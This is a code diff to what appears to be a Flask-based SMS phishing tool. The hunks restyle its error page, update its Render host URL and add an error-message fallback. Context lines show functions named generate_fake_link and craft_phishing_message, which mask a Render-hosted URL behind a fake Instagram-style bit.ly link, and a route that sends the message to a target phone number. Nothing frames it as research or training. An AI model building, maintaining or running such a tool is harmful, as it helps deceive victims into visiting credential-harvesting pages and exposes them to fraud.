@@ -182,11 +182,23 @@ MESSAGE_SENT_PAGE = """
 ERROR_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><title>Error</title></head>
+<head>
+    <title>Error</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        .container { max-width: 600px; margin: auto; padding: 20px; }
+        h1 { color: #d9534f; }
+        p { font-size: 16px; }
+        a { color: #007bff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
 <body>
-    <h1>Failed to Send Message</h1>
-    <p>Error: {error_message}</p>
-    <p><a href="/">Try Again</a></p>
+    <div class="container">
+        <h1>Failed to Send Message</h1>
+        <p><strong>Error:</strong> {{ error_message }}</p>
+        <p><a href="/">Try Again</a></p>
+    </div>
 </body>
 </html>
 """
@@ -199,7 +211,7 @@ def generate_fake_link():
     # Simulate a shortened link (e.g., bit.ly style)
     shortened_link = f"https://bit.ly/ig-{random_string[:6]}"
     # Actual link using Render URL
-    actual_link = f"https://demo-1.onrender.com/{random_string}"  # Updated with your Render URL
+    actual_link = f"https://demo-3.onrender.com/{random_string}"  # Updated with your Render URL
     return real_looking_link, shortened_link, actual_link, random_string
 
 def craft_phishing_message(shortened_link):
@@ -249,6 +261,9 @@ def send_message():
     if success:
         return render_template_string(MESSAGE_SENT_PAGE, phone_number=target_phone)
     else:
+        # Ensure error_message is passed correctly
+        if not error_message:
+            error_message = "An unknown error occurred while sending the message."
         return render_template_string(ERROR_PAGE, error_message=error_message)
 
 @app.route('/<path:path>', methods=['GET'])
